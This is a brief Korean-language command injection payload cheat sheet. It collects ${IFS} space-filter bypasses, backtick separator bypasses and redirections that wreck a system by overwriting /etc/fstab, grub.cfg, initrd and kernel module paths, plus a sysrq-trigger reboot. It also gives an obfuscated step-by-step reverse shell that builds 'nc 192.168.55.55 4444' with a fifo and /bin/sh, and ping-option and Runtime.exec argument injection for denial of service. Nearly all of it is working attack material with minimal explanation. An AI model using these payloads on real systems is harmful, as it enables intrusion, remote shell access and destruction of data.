# COMMAND INJECTION
공백 우회  
|/usr/bin/touch${IFS}/opt/test_injection  

---------------------------------------------------
and, or ,; 우회  

\`id>/opt/test_injection\`  

--------------------------------------
라다이렉션만을 이용하여 시스템 파괴  

id>/lib/modules/*/kernel/drivers/usb/storage  
id>/etc/fstab  
id>/etc/mtab  
id>/etc/inittab  
id>/boot/grub/grub.cfg  
id>/boot/initrd.img-$(uname -r)  
id>/etc/systemd/  
echo 'b'>/proc/sysrq-trigger  
<<<b>/proc/sysrq-trigger  
root일 경우만 덮어씌울수있음.  

--------------------------------------------  
;sleep 5 # 해당 명령어가 먹힐 경우 리버스tcp 가능  
;mkfifo${IFS}/opt/f;  
;printf${IFS}'nc\x20192.168.55.55\x204444'>/opt/b;  
;printf${IFS}'\x20</opt/f\x7Cbin/sh>/opt/f'>/opt/c;  
;cat${IFS}/opt/b${IFS}/opt/c>/opt/t;  
;chmod${IFS}777${IFS}/opt/t;  
;./opt/t;  

------------------------------------------

RUNTIME 함수에서 쉘 명시하지 않을 시     
다중 명령어를 지원하지 않아도  
악의적인 명령어 옵션을 주입하여 공격 가능  
공격자의 입력 값 && echo world  
Runtime.getRuntime().exec("echo Hello && echo World");  
그러나 악의적인 옵션은 주입 가능  
ping의 명령어가 있을때 입력 값 -c 9999 -s 65507 IP 시 DoS 공격 가능  
ping -c 9999 -s 65507 IP    
